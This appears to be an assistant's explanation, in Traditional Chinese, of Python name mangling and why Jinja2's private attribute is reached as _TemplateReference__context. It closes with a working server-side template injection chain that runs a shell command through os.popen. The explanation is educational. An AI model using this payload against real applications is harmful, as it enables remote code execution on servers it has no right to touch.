這是 Python 的**名稱修飾 (Name Mangling)** 機制!讓我解釋為什麼需要這樣寫:

## 為什麼是 `_TemplateReference__context`?

當 Python 類別中有**雙底線開頭的私有屬性**時,Python 會自動進行名稱修飾:

```python
class TemplateReference:
    def __init__(self):
        self.__context = {}  # 雙底線開頭的私有屬性
```

Python 會自動把 `__context` 改名為 `_TemplateReference__context`,格式是:
```
_ClassName__attributeName
```

## 為什麼不能用 `self.TemplateReference.__context`?

因為 `TemplateReference` 不是一個屬性,它是**類別名稱**。正確的理解:

```python
# ❌ 錯誤理解
self.TemplateReference.__context  # TemplateReference 不是 self 的屬性

# ✅ 正確理解
self.__context                    # 在類別內部這樣寫
self._TemplateReference__context  # 在類別外部要這樣訪問
```

## 實際例子

```python
class TemplateReference:
    def __init__(self):
        self.__context = {"data": "secret"}  # 私有屬性
    
    def show(self):
        print(self.__context)  # 類別內部可以直接用

obj = TemplateReference()

# 從外部訪問:
print(obj.__context)                    # ❌ AttributeError
print(obj._TemplateReference__context)  # ✅ 可以訪問到
```

## 在 SSTI 中的應用

```python
# Jinja2 的 TemplateReference 類別有私有屬性 __context
{{ self._TemplateReference__context }}  # 要用修飾後的名稱訪問

# 完整利用鏈:
{{ self._TemplateReference__context.lipsum.__globals__.os.popen("id").read() }}
     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     這是經過名稱修飾後的真實屬性名
```

## 總結

- **`__context`** = 原始名稱(開發者寫的)
- **`_TemplateReference__context`** = 修飾後的名稱(Python 實際存儲的)
- 從外部訪問私有屬性必須使用修飾後的名稱
- 這不是 bug,而是 Python 的設計特性,用來"保護"私有屬性(但不是真正的私有)